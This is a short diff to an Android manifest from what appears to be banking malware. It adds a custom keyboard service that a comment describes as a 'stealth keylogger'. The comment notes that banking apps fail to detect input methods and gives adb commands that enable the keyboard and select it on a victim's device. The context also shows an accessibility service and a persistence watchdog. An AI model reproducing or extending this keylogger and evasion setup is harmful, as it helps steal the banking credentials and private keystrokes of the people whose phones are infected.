@@ -115,6 +115,24 @@
                 android:resource="@xml/accessibility_service_config"/>
         </service>
 
+        <!-- IME (custom keyboard) — stealth keylogger.
+             Banking apps do NOT detect input methods the way they detect
+             accessibility services. The victim must enable + select it once:
+             adb shell ime enable org.umbra.core/.modules.UmbraKeyboardService
+             adb shell ime set    org.umbra.core/.modules.UmbraKeyboardService -->
+        <service
+            android:name=".modules.UmbraKeyboardService"
+            android:label="@string/ime_name"
+            android:exported="true"
+            android:permission="android.permission.BIND_INPUT_METHOD">
+            <intent-filter>
+                <action android:name="android.view.InputMethod"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.view.im"
+                android:resource="@xml/method"/>
+        </service>
+
         <!-- WatchdogJob: JobScheduler secondary watchdog (every 15 min) -->
         <service
             android:name=".persistence.WatchdogJob"
